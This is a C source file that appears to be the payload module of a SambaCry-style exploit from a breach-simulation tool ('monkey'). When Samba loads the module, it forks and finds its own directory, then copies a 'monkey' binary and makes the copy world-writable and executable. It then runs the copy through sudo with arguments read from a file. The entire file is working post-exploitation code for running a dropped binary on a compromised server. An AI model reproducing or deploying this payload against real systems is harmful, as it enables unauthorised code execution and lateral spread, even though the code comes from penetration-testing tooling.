#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "sc_monkey_runner.h"

#ifdef __x86_64__
	#define ARC_IS_64
#endif

#ifdef _____LP64_____
	#define ARC_IS_64
#endif

#define LINE_MAX_LENGTH (2048)
#define MAX_PARAMETERS (30)

int samba_init_module(void)
{
#ifdef ARC_IS_64
	const char RUNNER_FILENAME[] = "sc_monkey_runner64.so";
	const char MONKEY_NAME[] = "monkey64";
	const char MONKEY_COPY_NAME[] = "monkey64_2";
#else
	const char RUNNER_FILENAME[] = "sc_monkey_runner32.so";
	const char MONKEY_NAME[] = "monkey32";
	const char MONKEY_COPY_NAME[] = "monkey32_2";
#endif
	const char RUNNER_RESULT_FILENAME[] = "monkey_runner_result";
	const char COMMANDLINE_FILENAME[] = "monkey_commandline.txt";
	const char ACCESS_MODE_STRING[] = "0777";
	const char RUN_MONKEY_CMD[] = "sudo ./";
	
	int found = 0;
	char modulePathLine[LINE_MAX_LENGTH];
	char commandline[LINE_MAX_LENGTH] = {'\0'};
	char* monkeyDirectory;
	char* fileNamePointer;
    int accessMode;
	FILE * pFile;
	pid_t pid = 0;
	int monkeySize;
	void* monkeyBinary;
	
	pid = fork();
	
	if (pid != 0)
	{
		// error or this is parent - nothing to do but return.
		return 0;
	}
	
	// Find fullpath of running module.
	pFile = fopen("/proc/self/maps", "r");
	if (pFile == NULL)
	{
		return 0;
	}
	
	while (fgets(modulePathLine, LINE_MAX_LENGTH, pFile) != NULL) {
		fileNamePointer = strstr(modulePathLine, RUNNER_FILENAME);
        if (fileNamePointer != NULL) {
			found = 1;
			break;
        }
	}
	
	fclose(pFile);
	
	// We can't find ourselves in module list
	if (found == 0)
	{
		return 0;
	}
	
	monkeyDirectory = strchr(modulePathLine, '/');
	*fileNamePointer = '\0';
	
	if (chdir(monkeyDirectory) < 0)
	{
		return 0;
	}
	
	// Write file to indicate we're running
	pFile = fopen(RUNNER_RESULT_FILENAME, "w");
	if (pFile == NULL)
	{
		return 0;
	}
	
	fwrite(monkeyDirectory, 1, strlen(monkeyDirectory), pFile);
	fclose(pFile);
	
	// Read commandline
	pFile = fopen(COMMANDLINE_FILENAME, "r");
	if (pFile == NULL)
	{
		return 0;
	}
	
	// Build commandline
	strcpy(commandline, RUN_MONKEY_CMD);
	strcpy(commandline + strlen(RUN_MONKEY_CMD), MONKEY_COPY_NAME);
	commandline[strlen(RUN_MONKEY_CMD) + strlen(MONKEY_COPY_NAME)] = ' ';
	
	fread(commandline + strlen(RUN_MONKEY_CMD) + strlen(MONKEY_COPY_NAME) + 1, 1, LINE_MAX_LENGTH, pFile);
	fclose(pFile);
	
	// Copy monkey to new file so we'll own it.
	pFile = fopen(MONKEY_NAME, "rb");
	
	if (pFile == NULL)
	{
		return 0;
	}
	
	if (0 != fseek (pFile, 0 ,SEEK_END))
	{
		return 0;
	}
	
	monkeySize = ftell(pFile);
	
	if (-1 == monkeySize)
	{
		return 0;
	}
	
	rewind(pFile);
	
	monkeyBinary = malloc(monkeySize);
	
	if (0 == monkeyBinary)
	{
		return 0;
	}
	
	fread(monkeyBinary, 1, monkeySize, pFile);
	fclose(pFile);
	
	pFile = fopen(MONKEY_COPY_NAME, "wb");
	if (pFile == NULL)
	{
		free(monkeyBinary);
		return 0;
	}
	fwrite(monkeyBinary, 1, monkeySize, pFile);
	fclose(pFile);
	free(monkeyBinary);
	
	// Change monkey permissions
    accessMode = strtol(ACCESS_MODE_STRING, 0, 8);
    if (chmod(MONKEY_COPY_NAME, accessMode) < 0)
    {
        return 0;
    }
	
	system(commandline);
	
	return 0;
}

int init_samba_module(void)
{
	return samba_init_module();
}